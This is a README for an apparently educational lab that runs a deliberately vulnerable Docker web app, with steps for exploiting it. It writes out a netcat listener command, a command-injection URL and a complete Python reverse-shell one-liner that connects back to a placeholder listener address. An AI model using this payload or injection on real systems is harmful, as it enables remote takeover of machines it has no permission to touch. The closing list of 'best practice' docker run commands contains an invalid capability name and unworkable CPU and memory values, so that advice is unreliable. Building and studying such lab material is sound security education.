# Container Escapes 

**This project is for educational purposes only and aims to raise awareness of security vulnerabilities in Docker and related technologies. It is important to note that using these sample applications or code snippets without explicit permission may be illegal in an unauthorized environment.**

## Instructions

To run the demo app, follow these steps:

1. Install Docker on your system if it is not already installed.

2. Navigate to the 'demo-app' directory.

3. To create the Docker image, run: `sh build.sh`

4. To start the Docker container, run: `sh start.sh`

5. Open `http://localhost:8888` in your browser.

6. Now you can attempt to exploit the application using the provided example.

7. To stop the Docker container, simply press `CTRL+C` in the terminal.

## Example

The following example demonstrates how to exploit the demo app using the provided reverse shell script and the `nc` command.

1. Start the demo app as described above.

2. Start a netcat listener on your system: `nc -lvp 4444`

3. Open `http://localhost:8888` in your browser.

4. Use the following URL path to exploit the demo app and get a reverse shell: `http://localhost:8888/?cmd={reverse_shell_script}`

### Reverse Shell Script

Replace the following placeholders in the reverse shell script with your own values:
- `{IP_ADDRESS_LISTENER_MACHINE}` - IP address of the machine where the netcat listener is running.
- `{OPEN_PORT_ON_LISTENER_MACHINE}` - port number of the netcat listener.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP_ADDRESS_LISTENER_MACHINE}",{OPEN_PORT_ON_LISTENER_MACHINE}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Vulnerabilities

The following vulnerabilities are demonstrated in this project:

### Docker
[Mounted Docker Socket Escape](./docs/Escape-via-socket.md)



## Docker best and bad practices to run containers

😱 docker run -it --privileged ubuntu bash  
😨 docker run -it ubuntu bash  
😧 docker run -it --security-opt=no-new-privileges ubuntu bash  
😃 docker run -it --security-opt=no-new-privileges --cap-drop=ALL --cap-add=net_bin_service ubuntu bash  
🥰 docker run -it --security-opt=no-new-privileges --cap-drop=ALL --cap-add=net_bind_service --cpu-shares=0.5 --memory=200 ubuntu bash  




# Disclaimer

This project is intended for educational purposes only and is designed to illustrate and understand vulnerabilities in a controlled environment. The use of these application examples for unauthorized or illegal purposes is expressly prohibited. The author assumes no responsibility for improper or illegal use of this project.
